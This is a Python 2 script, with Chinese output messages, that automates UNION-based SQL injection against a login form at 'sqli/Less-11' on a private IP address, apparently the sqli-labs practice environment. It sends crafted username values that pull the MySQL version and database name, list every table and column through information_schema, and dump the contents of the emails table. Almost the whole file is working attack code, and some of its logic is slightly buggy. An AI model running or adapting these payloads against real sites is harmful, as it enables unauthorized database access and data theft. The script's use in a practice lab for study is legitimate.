#!/usr/bin/env python 
#coding:utf-8
import requests,sys,re,time 

url="http://192.168.32.142/sqli/Less-11/"



db_name = ''
tb_name = ''
col_name =''
value = "\' union select version(),database()#"
payload = {"uname": value, "passwd": 1}
r = requests.post(url, data=payload)
if "Your Login name" and "Your Password" in r.text:
    v = re.search(r'Your Login name.+\d',r.text)
    db_version=str(v.group().split(':')[1])
    db = re.search(r'Your Password.\w+',r.text)
    db_name = str(db.group().split(':')[1])
    print ('MySQL数据库版本:　%s' %db_version)   
    print ('数据库名称为:    %s' %db_name)


print "开始猜测表名......"
time.sleep(2)
value= ("\' union select 1,group_concat(table_name) from information_schema.tables where table_schema='%s' #") %db_name
payload = {"uname": value, "passwd": 1}
r = requests.post(url,data=payload)
if "Your Password" in r.text:
    tb = ','.join(re.findall(r'Password:(.*?)<br></font>',r.text))
    tb_name=str(tb).split(',')
    for i in range(len(tb_name)):
        print ('数据库%s第%d张表名:' %(db_name,i)) + tb_name[i]

print '*'*60
for i in tb_name:
    print ("开始猜测表%s下的所列名..." %i)
    time.sleep(2)
    value= ("\' union select 1,group_concat(column_name) from information_schema.columns where table_name='%s'#") %i
    payload = {"uname": value, "passwd": 1}
    r = requests.post(url,data=payload)
    if "Your Password" in r.text:
        em = ','.join(re.findall(r'Password:(.*?)<br></font>',r.text))
        em_name = str(em).split(',')
        for k in range(len(em_name)):
            print ("表%s第%d列的名称是:" %(i,k)) + em_name[k]
    print '-'*60

print '*'*60
print "开始猜测表emails下的所内容..."
time.sleep(2)
value = "\' union select 1,group_concat(id,'-->',email_id) from security.emails #"
payload = {"uname": value, "passwd": 1}
r=requests.post(url,data=payload)
if "Your Password" in r.text:
    name = ','.join(re.findall(r"Password:(.*?)<br></font>",r.text))
    name= str(name).split(',')
    for i in range(len(name)):
        print("Emails表的第%d数据是：" %i) + name[i]
